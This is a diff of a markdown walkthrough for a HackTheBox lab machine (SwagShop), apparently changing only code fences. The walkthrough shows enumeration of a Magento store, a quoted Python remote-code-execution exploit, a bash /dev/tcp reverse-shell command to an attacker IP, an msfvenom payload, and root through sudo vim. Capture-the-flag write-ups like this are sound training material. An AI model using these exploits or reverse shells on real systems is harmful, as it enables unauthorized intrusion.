@@ -16,7 +16,7 @@ This machine is used to learn more about the common Magento shop platform and to
 #### Step 1 - Enumeration
 -----
 As for all machines the first step was to enumerate on the nmap ports with an UDP scan.
-
+```bat
     kali@kali:~$ nmap -sV -sC -oA ./~/Documents/NmapScanWeek2 10.10.10.140
     Failed to open normal output file ./~/Documents/NmapScanWeek2.nmap for writing
     QUITTING!
@@ -35,11 +35,11 @@ As for all machines the first step was to enumerate on the nmap ports with an UD
     |_http-server-header: Apache/2.4.18 (Ubuntu)
     |_http-title: Home page
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
+```
 As it can be seen from the scan there are 2 open ports this gives the machine an easy to understand step by step plan. First exploit the web interface or the service running on port 80 until I can get credentials or a way to use the ssh port hopefully a key or something like that.
 
 Next I use Nikto to find any vulnerable paths
-
+```bat
     nikto -h 10.10.10.140
     - Nikto v2.1.6
     ---------------------------------------------------------------------------
@@ -65,7 +65,7 @@ Next I use Nikto to find any vulnerable paths
 
     + OSVDB-3268: /lib/: Directory indexing found.
     + OSVDB-3092: /lib/: This might be interesting...
-
+```
 With the help of those 2 paths I start looking for some interesting files or information. Luckly I find the following page 
 
 ![AppDirectory](/SwagShop/AppDirectory.png)
@@ -79,7 +79,7 @@ After some digging through all the files here I was able to find some potential 
 inside the local.xml file there was information about the version of magento that is being used. At first I did not know what this was but after looking at the front page of the website some more I was able to conclude that this is a framework much like wordpress but specialised for virtual stores.
 
 **Contents of local.xml**
-
+```bat
         **
         * Magento
         *
@@ -109,12 +109,13 @@ inside the local.xml file there was information about the version of magento tha
     <pdoType></pdoType><active>1</active>
     </connection></default_setup>
     </resources><session_save>files</session_save></global><admin><routers><adminhtml><args><frontName>admin</frontName></args></adminhtml></routers></admin></config>
-
+```
 Looking at the dbname I thought I could find an exploit for this machine something to do with sql.
 
 ---
 ### Step 2 -Exploitation
 ---
+```bat
     searchsploit magensearchsploit magento
     ------------------------------------------------------------------------------------------ ---------------------------------
     Exploit Title                                                                            |  Path
@@ -143,7 +144,7 @@ Looking at the dbname I thought I could find an exploit for this machine somethi
     searchsploit -x php/webapps/19793.txt
 
     searchsploit -m xml/webapps/37977.py
-
+```
 For the exploitation part I was able to find the current version of magento which proved to be old and had some preexisting exploits to it. 
 As such I tried them out. I was hoping to connect directly to the ssh but it seems there is a remote code execution exploit
 
@@ -153,7 +154,7 @@ As such I tried them out. I was hoping to connect directly to the ssh but it see
 
 In this page is the code for the executable needed to get a reverse shell going from the admin page.
 
-
+```bat
     from hashlib import md5
     import sys
     import re
@@ -222,10 +223,10 @@ In this page is the code for the executable needed to get a reverse shell going 
         request = br.open(exploit)
     except (mechanize.HTTPError, mechanize.URLError) as e:
         print e.read()
-
+```
 The code used to get inside the machine with a reverse shell
 
-
+```bat
     kali@kali:~/Documents/Week3 -HackTheBox$ python 37811.py http://10.10.10.140/index.php/admin/ 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'
     Traceback (most recent call last):
     File "37811.py", line 55, in <module>
@@ -242,14 +243,14 @@ The code used to get inside the machine with a reverse shell
     /// failed attempt 
     //read up on mechanize this could be a good thing to learn. It's useful to browse forms.
     //pdb is used for debuggin in python, should learn python indepth if I want to have a better time at this.
-
+```
 
 This was a failed attmept at using the mahchine
 
 ---
 ### Step 3 - Foothold
 ---
-
+```bat
     kali@kali:~/Documents/Week3 -HackTheBox$ msfvenom -p linux/x64/shell_reverse_ipv6_tcp LHOST=dead:beef:2::1011 LPORT=12345 -f elf -o lin-x64-ipv6-rev-12345.elf
     [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
     [-] No arch selected, selecting arch: x64 from the payload
@@ -278,9 +279,9 @@ This was a failed attmept at using the mahchine
     uid=33(www-data) gid=33(www-data) groups=33(www-data)
     ls       
 ....etc look throuhg it to see what I find.
-
+```
 Using nc to open a listening port to connect to machine and then running the script I was able to get inside the machine with a reverse shell, even though the shell was kind of hard to use.
-
+```bat
 cd home
 ls
 haris
@@ -290,14 +291,14 @@ user.txt
 cat user.txt
 a448877277e82f05e5ddf9f90aefbac8
 echo "$USER"
-
+```
 ---
 ### Step 4 - Privilage Escalation
 ---
 
 For privileage escalation I had to look through the machine and to find any programs that might run with escalated privelages.
 I first tried sudo su which did not work next I looked for services with admin privileages and found sudo -l
-
+```bat
     sudo -l
     Matching Defaults entries for www-data on swagshop:
         env_reset, mail_badpass,
@@ -348,5 +349,5 @@ I first tried sudo su which did not work next I looked for services with admin p
     |___|.__|       https://hackthebox.store/password
 
                     PS: Use root flag as password!
-
+```
 What happend here I eneted into /var/www/www-data file which had sudo privileges withm vim and then from vim I escaped to a terminal making  myself root and giving myself access to the root shell.
